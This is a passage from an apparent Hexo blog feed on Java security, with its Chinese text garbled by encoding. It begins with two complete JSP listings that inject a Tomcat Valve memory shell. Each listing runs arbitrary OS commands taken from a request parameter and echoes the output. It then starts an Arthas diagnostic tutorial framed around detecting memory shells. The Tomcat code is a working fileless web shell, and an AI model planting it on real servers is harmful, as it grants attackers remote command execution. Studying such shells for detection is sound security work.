%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">evilStandardPipeline</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">evilValve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    evilStandardPipeline.addValve(evilValve);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¿™ä¸ªæ˜¯é‡‡ç”¨äº†ä»<code>StandardContext</code>åå°„è·å–<code>StandardPipeline</code>çš„æ–¹å¼ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164016715.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164016715.png" alt="img"></a></p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164029228.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164029228.png" alt="img"></a></p><p>ä¸‹é¢çš„åˆ™æ˜¯è°ƒç”¨ <code>standardContext.getPipeline().addValve</code>å®ç°çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">testEvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;command&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">          isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;command&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;command&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">  requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">  standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">testEvilValve</span>());</span><br><span class="line">  out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164109133.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164109133.png" alt="img"></a></p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164219944.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164219944.png" alt="img"></a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908012707752.png" alt="image-20250908012707752"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Tomcat-å®¹å™¨&quot;&gt;&lt;a href=&quot;#Tomcat-å®¹å™¨&quot; class=&quot;headerlink&quot; title=&quot;Tomcat å®¹å™¨&quot;&gt;&lt;/a&gt;Tomcat å®¹å™¨&lt;/h2&gt;&lt;p&gt;Tomcat è®¾è®¡äº†å››ç§å®¹å™¨ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextå’ŒWrap</summary>
      
    
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Arthasåœ¨å†…å­˜é©¬æŸ¥æ€ä¸­çš„åº”ç”¨</title>
    <link href="https://250wuyifan.github.io/2025/09/06/Arthas%E5%9C%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://250wuyifan.github.io/2025/09/06/Arthas%E5%9C%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2025-09-06T12:31:42.000Z</published>
    <updated>2025-09-09T17:53:30.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Arthasä»‹ç»"><a href="#Arthasä»‹ç»" class="headerlink" title="Arthasä»‹ç»"></a>Arthasä»‹ç»</h1><p><a href="https://github.com/alibaba/arthas/blob/master/README_CN.md">README</a>  </p><p><a href="https://arthas.aliyun.com/doc/quick-start.html">å¿«é€Ÿå…¥é—¨</a></p><p>Arthas æ˜¯é˜¿é‡Œå·´å·´å¼€æºçš„ä¸€æ¬¾<strong>å¼ºå¤§çš„ Java åº”ç”¨è¯Šæ–­å·¥å…·</strong>ï¼Œæ·±å—å¼€å‘è€…å°¤å…¶æ˜¯ Java åç«¯å’Œè¿ç»´äººå‘˜çš„å–œçˆ±ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåœ¨çº¿ JVM ç›‘æ§ã€åˆ†æå’Œè¯Šæ–­çš„å¹³å°ï¼Œå¯ä»¥å¸®åŠ©ä½ åœ¨ä¸é‡å¯æœåŠ¡çš„æƒ…å†µä¸‹ï¼Œå¿«é€Ÿå®šä½å’Œè§£å†³çº¿ä¸Šçš„å„ç§æ€§èƒ½ã€åŠŸèƒ½é—®é¢˜ã€‚</p><p>ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆæ˜¯ <strong>Java åº”ç”¨çš„â€œå¬è¯Šå™¨â€æˆ–â€œæ‰‹æœ¯åˆ€â€</strong>ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906203847377.png" alt="image-20250906203847377"></p><h1 id="å¿«é€Ÿå…¥é—¨"><a href="#å¿«é€Ÿå…¥é—¨" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h1><p>å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è‡ªå·±åŠ¨æ‰‹å®è·µï¼Œä¹Ÿå¯ä»¥é€šè¿‡æˆ‘ä»¬çš„<a href="https://arthas.aliyun.com/doc/arthas-tutorials.html?language=cn&id=arthas-basics">åœ¨çº¿æ•™ç¨‹</a>ï¼Œè·Ÿéšæ•™ç¨‹å¿«é€Ÿå…¥é—¨ã€‚</p><h2 id="1-å¯åŠ¨-math-game"><a href="#1-å¯åŠ¨-math-game" class="headerlink" title="1. å¯åŠ¨ math-game"></a>1. å¯åŠ¨ math-game</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://arthas.aliyun.com/math-game.jar</span><br><span class="line">java -jar math-game.jar</span><br></pre></td></tr></table></figure><p><code>math-game</code>æ˜¯ä¸€ä¸ªç®€å•çš„ç¨‹åºï¼Œæ¯éš”ä¸€ç§’ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œå†æ‰§è¡Œè´¨å› æ•°åˆ†è§£ï¼Œå¹¶æ‰“å°å‡ºåˆ†è§£ç»“æœã€‚</p><p><code>math-game</code>æºä»£ç ï¼š<a href="https://github.com/alibaba/arthas/blob/master/math-game/src/main/java/demo/MathGame.java">æŸ¥çœ‹</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204426294.png" alt="image-20250906204426294"></p><h2 id="2-å¯åŠ¨-arthas"><a href="#2-å¯åŠ¨-arthas" class="headerlink" title="2. å¯åŠ¨ arthas"></a>2. å¯åŠ¨ arthas</h2><p>åœ¨å‘½ä»¤è¡Œä¸‹é¢æ‰§è¡Œï¼ˆä½¿ç”¨å’Œç›®æ ‡è¿›ç¨‹ä¸€è‡´çš„ç”¨æˆ·å¯åŠ¨ï¼Œå¦åˆ™å¯èƒ½ attach å¤±è´¥ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://arthas.aliyun.com/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure><ul><li>æ‰§è¡Œè¯¥ç¨‹åºçš„ç”¨æˆ·éœ€è¦å’Œç›®æ ‡è¿›ç¨‹å…·æœ‰ç›¸åŒçš„æƒé™ã€‚æ¯”å¦‚ä»¥<code>admin</code>ç”¨æˆ·æ¥æ‰§è¡Œï¼š<code>sudo su admin &amp;&amp; java -jar arthas-boot.jar</code> æˆ– <code>sudo -u admin -EH java -jar arthas-boot.jar</code>ã€‚</li><li>å¦‚æœ attach ä¸ä¸Šç›®æ ‡è¿›ç¨‹ï¼Œå¯ä»¥æŸ¥çœ‹<code>~/logs/arthas/</code> ç›®å½•ä¸‹çš„æ—¥å¿—ã€‚</li><li>å¦‚æœä¸‹è½½é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œå¯ä»¥ä½¿ç”¨ aliyun çš„é•œåƒï¼š<code>java -jar arthas-boot.jar --repo-mirror aliyun --use-http</code></li><li><code>java -jar arthas-boot.jar -h</code> æ‰“å°æ›´å¤šå‚æ•°ä¿¡æ¯ã€‚</li></ul><p>é€‰æ‹©åº”ç”¨ java è¿›ç¨‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ $ java -jar arthas-boot.jar</span><br><span class="line">* [1]: 35542</span><br><span class="line">  [2]: 71560 math-game.jar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204402361.png" alt="image-20250906204402361"></p><p><code>math-game</code>è¿›ç¨‹æ˜¯ç¬¬ 1 ä¸ªï¼Œåˆ™è¾“å…¥ 1ï¼Œå†è¾“å…¥<code>å›è½¦/enter</code>ã€‚Arthas ä¼š attach åˆ°ç›®æ ‡è¿›ç¨‹ä¸Šï¼Œå¹¶è¾“å‡ºæ—¥å¿—ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Try to attach process 71560</span><br><span class="line">[INFO] Attach process 71560 success.</span><br><span class="line">[INFO] arthas-client connect 127.0.0.1 3658</span><br><span class="line">  ,---.  ,------. ,--------.,--.  ,--.  ,---.   ,---.</span><br><span class="line"> /  O  \ |  .--. <span class="string">&#x27;&#x27;</span>--.  .--<span class="string">&#x27;|  &#x27;</span>--<span class="string">&#x27;  | /  O  \ &#x27;</span>   .-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|  .-.  ||  &#x27;</span>--<span class="string">&#x27;.&#x27;</span>   |  |   |  .--.  ||  .-.  |`.  `-.</span><br><span class="line">|  | |  ||  |\  \    |  |   |  |  |  ||  | |  |.-<span class="string">&#x27;    |</span></span><br><span class="line"><span class="string">`--&#x27;</span> `--<span class="string">&#x27;`--&#x27;</span> <span class="string">&#x27;--&#x27;</span>   `--<span class="string">&#x27;   `--&#x27;</span>  `--<span class="string">&#x27;`--&#x27;</span> `--<span class="string">&#x27;`-----&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wiki: https://arthas.aliyun.com/doc</span><br><span class="line">version: 3.0.5.20181127201536</span><br><span class="line">pid: 71560</span><br><span class="line"><span class="keyword">time</span>: 2018-11-28 19:16:24</span><br><span class="line"></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204520108.png" alt="image-20250906204520108"></p><h2 id="3-æŸ¥çœ‹-dashboard"><a href="#3-æŸ¥çœ‹-dashboard" class="headerlink" title="3. æŸ¥çœ‹ dashboard"></a>3. æŸ¥çœ‹ dashboard</h2><p>è¾“å…¥<a href="https://arthas.aliyun.com/doc/dashboard.html">dashboard</a>ï¼ŒæŒ‰<code>å›è½¦/enter</code>ï¼Œä¼šå±•ç¤ºå½“å‰è¿›ç¨‹çš„ä¿¡æ¯ï¼ŒæŒ‰<code>ctrl+c</code>å¯ä»¥ä¸­æ–­æ‰§è¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ dashboard</span><br><span class="line">ID     NAME                   GROUP          PRIORI STATE  %CPU    TIME   INTERRU DAEMON</span><br><span class="line">17     pool-2-thread-1        system         5      WAITIN 67      0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">27     Timer-for-arthas-dashb system         10     RUNNAB 32      0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">11     AsyncAppender-Worker-a system         9      WAITIN 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">9      Attach Listener        system         9      RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">3      Finalizer              system         8      WAITIN 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">2      Reference Handler      system         10     WAITIN 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">4      Signal Dispatcher      system         9      RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">26     as-command-execute-dae system         10     TIMED_ 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">13     job-timeout            system         9      TIMED_ 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">1      main                   main           5      TIMED_ 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">14     nioEventLoopGroup-2-1  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">18     nioEventLoopGroup-2-2  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">23     nioEventLoopGroup-2-3  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">15     nioEventLoopGroup-3-1  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">Memory             used   total max    usage GC</span><br><span class="line">heap               32M    155M  1820M  1.77% gc.ps_scavenge.count  4</span><br><span class="line">ps_eden_space      14M    65M   672M   2.21% gc.ps_scavenge.time(m 166</span><br><span class="line">ps_survivor_space  4M     5M    5M           s)</span><br><span class="line">ps_old_gen         12M    85M   1365M  0.91% gc.ps_marksweep.count 0</span><br><span class="line">nonheap            20M    23M   -1           gc.ps_marksweep.time( 0</span><br><span class="line">code_cache         3M     5M    240M   1.32% ms)</span><br><span class="line">Runtime</span><br><span class="line">os.name                Mac OS X</span><br><span class="line">os.version             10.13.4</span><br><span class="line">java.version           1.8.0_162</span><br><span class="line">java.home              /Library/Java/JavaVir</span><br><span class="line">                       tualMachines/jdk1.8.0</span><br><span class="line">                       _162.jdk/Contents/Hom</span><br><span class="line">                       e/jre</span><br></pre></td></tr></table></figure><h2 id="4-é€šè¿‡-thread-å‘½ä»¤æ¥è·å–åˆ°math-gameè¿›ç¨‹çš„-Main-Class"><a href="#4-é€šè¿‡-thread-å‘½ä»¤æ¥è·å–åˆ°math-gameè¿›ç¨‹çš„-Main-Class" class="headerlink" title="4. é€šè¿‡ thread å‘½ä»¤æ¥è·å–åˆ°math-gameè¿›ç¨‹çš„ Main Class"></a>4. é€šè¿‡ thread å‘½ä»¤æ¥è·å–åˆ°<code>math-game</code>è¿›ç¨‹çš„ Main Class</h2><p><code>thread 1</code>ä¼šæ‰“å°çº¿ç¨‹ ID 1 çš„æ ˆï¼Œé€šå¸¸æ˜¯ main å‡½æ•°çš„çº¿ç¨‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ thread 1 | grep <span class="string">&#x27;main(&#x27;</span></span><br><span class="line">    at demo.MathGame.main(MathGame.java:17)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204719435.png" alt="image-20250906204719435"></p><h2 id="5-é€šè¿‡-jad-æ¥åç¼–è¯‘-Main-Class"><a href="#5-é€šè¿‡-jad-æ¥åç¼–è¯‘-Main-Class" class="headerlink" title="5. é€šè¿‡ jad æ¥åç¼–è¯‘ Main Class"></a>5. é€šè¿‡ jad æ¥åç¼–è¯‘ Main Class</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">$ jad demo.MathGame</span><br><span class="line"></span><br><span class="line">ClassLoader:</span><br><span class="line">+-sun.misc.Launcher$AppClassLoader@3d4eac69</span><br><span class="line">  +-sun.misc.Launcher$ExtClassLoader@66350f69</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line">/tmp/math-game.jar</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR 0_132.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MathGame</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">illegalArgumentCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] 